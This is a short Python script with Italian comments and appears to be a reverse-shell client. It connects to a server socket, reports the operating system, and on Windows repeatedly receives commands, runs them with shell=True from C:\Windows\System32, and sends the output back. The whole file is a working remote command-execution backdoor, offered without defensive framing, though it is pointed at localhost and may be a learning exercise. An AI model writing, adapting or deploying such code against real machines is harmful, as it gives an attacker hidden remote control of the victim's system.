from socket import *
import os
import subprocess


serverName = 'localhost'
serverPort = 120
cmd = "cd C:\Windows\System32 && "
clientSocket = socket(AF_INET, SOCK_STREAM)
clientSocket.connect((serverName, serverPort))
clientSocket.send(os.name.encode())
print("In attesa di un input dal server..")

if os.name == 'nt':
    while True:
        data = clientSocket.recv(1024)  # 1024 grandezza dei byte
        cmd += data.decode('utf-8')
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, shell=True)
        out, err = proc.communicate()
        clientSocket.send(out)
        cmd = "cd C:\Windows\System32 && "

clientSocket.close()
